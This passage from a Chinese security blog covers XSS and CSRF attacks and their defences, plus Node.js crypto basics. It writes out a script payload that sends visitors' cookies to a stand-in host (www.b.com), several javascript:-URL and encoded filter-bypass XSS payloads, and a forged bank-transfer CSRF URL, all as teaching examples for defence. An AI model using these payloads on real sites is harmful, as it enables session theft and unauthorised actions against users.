<h3 id="持久型XSS"><a href="#持久型XSS" class="headerlink" title="持久型XSS"></a>持久型XSS</h3><p>也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
<p><strong>场景二</strong>：<br>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
<h3 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h3><ul>
<li><p>输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
<p>| less-than character (&lt;)                                      | &lt;                                                     |<br>| ———————————————————— | ——————————————————– |<br>| greater-than character (&gt;)                                   | &gt;                                                     |<br>| ampersand character (&amp;)                                      | &amp;                                                    |<br>| double-quote character (“)                                   | &quot;                                                   |<br>| space character( )                                           | &nbsp;                                                   |<br>| Any ASCII code character whose code is greater-than or equal to 0x80 | &amp;#<number>, where <number> is the ASCII character value. |</number></number></p>
</li>
</ul>
<p>比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="noopener">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
<ul>
<li>输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。</li>
</ul>
<h3 id="使用-HttpOnly-Cookie"><a href="#使用-HttpOnly-Cookie" class="headerlink" title="使用 HttpOnly Cookie"></a>使用 HttpOnly Cookie</h3><p>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上<code>cookie</code>字段，但是在<code>js</code>脚本中却不能访问这个cookie，这样就避免了XSS攻击利用<code>JavaScript</code>的<code>document.cookie</code>获取<code>cookie</code>。</p>
<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>单篇说</p>
<h3 id="困难和幸运"><a href="#困难和幸运" class="headerlink" title="困难和幸运"></a>困难和幸运</h3><p>过滤 Html 标签能否防止 XSS? 请列举不能的情况?</p>
<p>用户除了上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>还可以使用图片 url 等方式来上传脚本进行攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>还可以使用各种方式来回避检查, 例如空格, 回车, Tab</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:</span><br><span class="line">alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=%22javascript:alert(&apos;xss&apos;);%22&gt;</span><br><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。<br>幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如<code>vue.js</code>、<code>react.js</code>等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。<br>同时，许多基于<code>MVVM</code>框架的<code>SPA</code>（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ghsau/article/details/17027893">https://blog.csdn.net/ghsau/article/details/17027893</a></p>
<p><a href="https://www.imooc.com/article/13553">https://www.imooc.com/article/13553</a></p>
<p><a href="https://blog.csdn.net/u011781521/article/details/53894399">https://blog.csdn.net/u011781521/article/details/53894399</a></p>
<p><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss">https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss</a></p>
</script></li></ul>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/18/网络安全/XSS攻击及预防/" data-id="cjujf4p5g007hcp6fafvvp7pa" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/CSRF攻击及预防" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/16/网络安全/CSRF攻击及预防/" class="article-date">
  <time datetime="2017-02-16T06:45:23.000Z" itemprop="datePublished">2017-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/16/网络安全/CSRF攻击及预防/">CSRF攻击及预防</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求，也被称为：one click attack/session riding，缩写为：CSRF/XSRF）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>下图简单阐述了CSRF的原理:</p>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csrf.jpg" alt></p>
<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：</p>
<ul>
<li>登录受信任网站A，并在本地生成Cookie。</li>
<li>在不登出A的情况下，访问危险网站B。</li>
</ul>
<p>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：</p>
<ul>
<li>你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站。</li>
<li>你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。</li>
<li>上述中所谓的攻击网站，可能就是一个钓鱼网站。</li>
</ul>
<h2 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h2><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p>
<h2 id="CSRF如何防御"><a href="#CSRF如何防御" class="headerlink" title="CSRF如何防御"></a>CSRF如何防御</h2><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<h3 id="添加token验证"><a href="#添加token验证" class="headerlink" title="添加token验证"></a>添加token验证</h3><p>CSRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都存在cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。要防止CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。<br> 现在业界一致的做法就是使用Anti CSRF Token来防御CSRF。</p>
<ul>
<li>用户访问某个表单页面。</li>
<li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li>
<li>在页面表单附带上Token参数。</li>
<li>用户提交请求后，服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li>
</ul>
<p>这个Token值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token应注意Token的保密性，尽量把敏感操作由GET改成POST，以form或者AJAX形式提交，避免Token泄露。</p>
<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。通常情况下，验证码能够很好的遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段。</p>
<h3 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h3><p>GET接口能够直接将请求地址暴露给攻击者，所以要防止CSRF一定最好不要用GET。当然POST并不是万无一失，攻击者只需要构造一个form表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p>
<h3 id="在HTTP头部添加自定义属性"><a href="#在HTTP头部添加自定义属性" class="headerlink" title="在HTTP头部添加自定义属性"></a>在HTTP头部添加自定义属性</h3><p>这种方法也是使用token并验证，但是它是把token放在HTTP请求头部中。通过使用AJAX我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/cxying93/p/6035031.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxying93/p/6035031.html</a><br><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html</a><br><a href="https://www.imooc.com/article/18069" target="_blank" rel="noopener">https://www.imooc.com/article/18069</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/16/网络安全/CSRF攻击及预防/" data-id="cjujf4p5d0079cp6febwy5zj0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/Node.js中crypto模块" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/12/网络安全/Node.js中crypto模块/" class="article-date">
  <time datetime="2017-02-12T06:45:23.000Z" itemprop="datePublished">2017-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/12/网络安全/Node.js中crypto模块/">Node.js中的crypto模块</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h2><p>互联网时代，网络上的数据量每天都在以惊人的速度增长。同时，各类网络安全问题层出不穷。在信息安全重要性日益凸显的今天，作为一名开发者，需要加强对安全的认识，并通过技术手段增强服务的安全性。</p>
<p><code>crypto</code>模块是nodejs的核心模块之一，它提供了安全相关的功能，如摘要运算、加密、电子签名等。很多初学者对着长长的API列表，不知如何上手，因此它背后涉及了大量安全领域的知识。</p>
<p>本文重点讲解API背后的理论知识，主要包括如下内容：</p>
<ol>
<li>摘要（hash）、基于摘要的消息验证码（HMAC）</li>
<li>对称加密、非对称加密、电子签名</li>
<li>分组加密模式</li>
</ol>
<h2 id="二、摘要（hash）"><a href="#二、摘要（hash）" class="headerlink" title="二、摘要（hash）"></a>二、摘要（hash）</h2><p>摘要（digest）：将长度不固定的消息作为输入，通过运行hash函数，生成固定长度的输出，这段输出就叫做摘要。通常用来验证消息完整、未被篡改。</p>
<p>摘要运算是不可逆的。也就是说，输入固定的情况下，产生固定的输出。但知道输出的情况下，无法反推出输入。</p>
<p>伪代码如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">digest = Hash(message)</span><br></pre></td></tr></table></figure></p>
<p>常见的摘要算法 与 对应的输出位数如下：</p>
<ul>
<li>MD5：128位</li>
<li>SHA-1：160位</li>
<li>SHA256 ：256位</li>
<li>SHA512：512位</li>
</ul>
<p>nodejs中的例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> md5 = crypto.createHash(<span class="string">'md5'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> message = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">var</span> digest = md5.update(message, <span class="string">'utf8'</span>).digest(<span class="string">'hex'</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(digest);</span><br><span class="line"><span class="comment">// 输出如下：注意这里是16进制</span></span><br><span class="line"><span class="comment">// 5d41402abc4b2a76b9719d911017c592</span></span><br></pre></td></tr></table></figure>
<p>备注：在各类文章或文献中，摘要、hash、散列 这几个词经常会混用，导致不少初学者看了一脸懵逼，其实大部分时候指的都是一回事，记住上面对摘要的定义就好了。</p>
<h2 id="三、MAC、HMAC"><a href="#三、MAC、HMAC" class="headerlink" title="三、MAC、HMAC"></a>三、MAC、HMAC</h2><p>MAC（Message Authentication Code）：消息认证码，用以保证数据的完整性。运算结果取决于消息本身、秘钥。</p>
<p>MAC可以有多种不同的实现方式，比如HMAC。</p>
<p>HMAC（Hash-based Message Authentication Code）：可以粗略地理解为带秘钥的hash函数。</p>
<p>nodejs例子如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数一：摘要函数</span></span><br><span class="line"><span class="comment">// 参数二：秘钥</span></span><br><span class="line"><span class="keyword">let</span> hmac = crypto.createHmac(<span class="string">'md5'</span>, <span class="string">'123456'</span>);</span><br><span class="line"><span class="keyword">let</span> ret = hmac.update(<span class="string">'hello'</span>).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ret);</span><br><span class="line"><span class="comment">// 9c699d7af73a49247a239cb0dd2f8139</span></span><br></pre></td></tr></table></figure>
<h2 id="四、对称加密、非对称加密"><a href="#四、对称加密、非对称加密" class="headerlink" title="四、对称加密、非对称加密"></a>四、对称加密、非对称加密</h2><p><strong>加密/解密</strong>：给定明文，通过一定的算法，产生加密后的密文，这个过程叫加密。反过来就是解密。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt( plainText )</span><br><span class="line">plainText = decrypt( encryptedText )</span><br></pre></td></tr></table></figure></p>
<p><strong>秘钥</strong>：为了进一步增强加/解密算法的安全性，在加/解密的过程中引入了秘钥。秘钥可以视为加/解密算法的参数，在已知密文的情况下，如果不知道解密所用的秘钥，则无法将密文解开。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, encryptKey)</span><br><span class="line">plainText = decrypt(encryptedText, decryptKey)</span><br></pre></td></tr></table></figure></p>
<p>根据加密、解密所用的秘钥是否相同，可以将加密算法分为<strong>对称加密</strong>、<strong>非对称加密</strong>。</p>
<h3 id="1、对称加密"><a href="#1、对称加密" class="headerlink" title="1、对称加密"></a>1、对称加密</h3><p>加密、解密所用的秘钥是相同的，即<code>encryptKey === decryptKey</code>。</p>
<p>常见的对称加密算法：DES、3DES、AES、Blowfish、RC5、IDEA。</p>
<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, key); <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, key); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2、非对称加密"><a href="#2、非对称加密" class="headerlink" title="2、非对称加密"></a>2、非对称加密</h3><p>又称公开秘钥加密。加密、解密所用的秘钥是不同的，即<code>encryptKey !== decryptKey</code>。</p>
<p>加密秘钥公开，称为公钥。解密秘钥保密，称为秘钥。</p>
<p>常见的非对称加密算法：RSA、DSA、ElGamal。</p>
<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, publicKey);  <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, priviteKey); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3、对比与应用"><a href="#3、对比与应用" class="headerlink" title="3、对比与应用"></a>3、对比与应用</h3><p>除了秘钥的差异，还有运算速度上的差异。通常来说：</p>
<ol>
<li>对称加密速度要快于非对称加密。</li>
<li>非对称加密通常用于加密短文本，对称加密通常用于加密长文本。</li>
</ol>
<p>两者可以结合起来使用，比如HTTPS协议，可以在握手阶段，通过RSA来交换生成对称秘钥。在之后的通讯阶段，可以使用对称加密算法对数据进行加密，秘钥则是握手阶段生成的。 </p>
<p>备注：对称秘钥交换不一定通过RSA，还可以通过类似DH来完成，这里不展开。</p>
<h2 id="五、数字签名"><a href="#五、数字签名" class="headerlink" title="五、数字签名"></a>五、数字签名</h2><p>从<strong>签名</strong>大致可以猜到<strong>数字签名</strong>的用途。主要作用如下：</p>
<ol>
<li>确认信息来源于特定的主体。</li>
<li>确认信息完整、未被篡改。</li>
</ol>
<p>为了达到上述目的，需要有两个过程：</p>
<ol>
<li>发送方：生成签名。</li>
<li>接收方：验证签名。</li>
</ol>
<h3 id="1、发送方生成签名"><a href="#1、发送方生成签名" class="headerlink" title="1、发送方生成签名"></a>1、发送方生成签名</h3><ol>
<li>计算原始信息的摘要。</li>
<li>通过私钥对摘要进行签名，得到电子签名。</li>
<li>将原始信息、电子签名，发送给接收方。</li>
</ol>
<p>附：签名伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">digest = hash(message); <span class="comment">// 计算摘要</span></span><br><span class="line">digitalSignature = sign(digest,  priviteKey); <span class="comment">// 计算数字签名</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2、接收方验证签名"><a href="#2、接收方验证签名" class="headerlink" title="2、接收方验证签名"></a>2、接收方验证签名</h3><ol>
<li>通过公钥解开电子签名，得到摘要D1。（如果解不开，信息来源主体校验失败）</li>
<li>计算原始信息的摘要D2。</li>
<li>对比D1、D2，如果D1等于D2，说明原始信息完整、未被篡改。</li>
</ol>
<p>附：签名验证伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">digest1 = verify(digitalSignature, publicKey); <span class="comment">// 获取摘要</span></span><br><span class="line">digest2 = hash(message); <span class="comment">// 计算原始信息的摘要</span></span><br><span class="line">digest1 === digest2      <span class="comment">// 验证是否相等</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3、对比非对称加密"><a href="#3、对比非对称加密" class="headerlink" title="3、对比非对称加密"></a>3、对比非对称加密</h3><p>由于RSA算法的特殊性，加密/解密、签名/验证 看上去特别像，很多同学都很容易混淆。先记住下面结论，后面有时间再详细介绍。</p>
<ol>
<li>加密/解密：公钥加密，私钥解密。</li>
<li>签名/验证：私钥签名，公钥验证。</li>
</ol>
<h2 id="六、分组加密模式、填充、初始化向量"><a href="#六、分组加密模式、填充、初始化向量" class="headerlink" title="六、分组加密模式、填充、初始化向量"></a>六、分组加密模式、填充、初始化向量</h2><p>常见的对称加密算法，如AES、DES都采用了分组加密模式。这其中，有三个关键的概念需要掌握：模式、填充、初始化向量。</p>
<p>搞清楚这三点，才会知道crypto模块对称加密API的参数代表什么含义，出了错知道如何去排查。</p>
<h3 id="1、分组加密模式"><a href="#1、分组加密模式" class="headerlink" title="1、分组加密模式"></a>1、分组加密模式</h3><p>所谓的分组加密，就是将（较长的）明文拆分成固定长度的块，然后对拆分的块按照特定的模式进行加密。</p>
<p>常见的分组加密模式有：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR等。</p>
<p>以最简单的ECB为例，先将消息拆分成等分的模块，然后利用秘钥进行加密。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_encryption.svg.png" alt><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_decryption.svg.png" alt><br>更多关于分组加密模式的介绍可以参考 <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Common_modes" target="_blank" rel="noopener">wiki</a>。</p>
<p>后面假设每个块的长度为128位</p>
<h3 id="2、初始化向量：IV"><a href="#2、初始化向量：IV" class="headerlink" title="2、初始化向量：IV"></a>2、初始化向量：IV</h3><p>为了增强算法的安全性，部分分组加密模式（CFB、OFB、CTR）中引入了初始化向量（IV），使得加密的结果随机化。也就是说，对于同一段明文，IV不同，加密的结果不同。</p>
<p>以CBC为例，每一个数据块，都与前一个加密块进行亦或运算后，再进行加密。对于第一个数据块，则是与IV进行亦或。</p>
<p>IV的大小跟数据块的大小有关（128位），跟秘钥的长度无关。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_encryption.svg.png" alt><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_decryption.svg.png" alt></p>
<h3 id="3、填充：padding"><a href="#3、填充：padding" class="headerlink" title="3、填充：padding"></a>3、填充：padding</h3><p>分组加密模式需要对长度固定的块进行加密。分组拆分完后，最后一个数据块长度可能小于128位，此时需要进行填充以满足长度要求。</p>
<p>填充方式有多重。常见的填充方式有<a href="https://tools.ietf.org/html/rfc5652#section-6.3" target="_blank" rel="noopener">PKCS7</a>。</p>
<p>假设分组长度为k字节，最后一个分组长度为k-last，可以看到：</p>
<ol>
<li>不管明文长度是多少，加密之前都会会对明文进行填充 （不然解密函数无法区分最后一个分组是否被填充了，因为存在最后一个分组长度刚好等于k的情况）</li>
<li>如果最后一个分组长度等于k-last === k，那么填充内容为一个完整的分组 k k k … k （k个字节）</li>
<li>如果最后一个分组长度小于k-last &lt; k，那么填充内容为 k-last mod k </li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">         01 -- if lth mod k = k-1</span><br><span class="line">      02 02 -- if lth mod k = k-2</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">k k ... k k -- if lth mod k = 0</span><br></pre></td></tr></table></figure>
<h3 id="概括来说"><a href="#概括来说" class="headerlink" title="概括来说"></a>概括来说</h3><ol>
<li>分组加密：先将明文切分成固定长度的块（128位），再进行加密。</li>
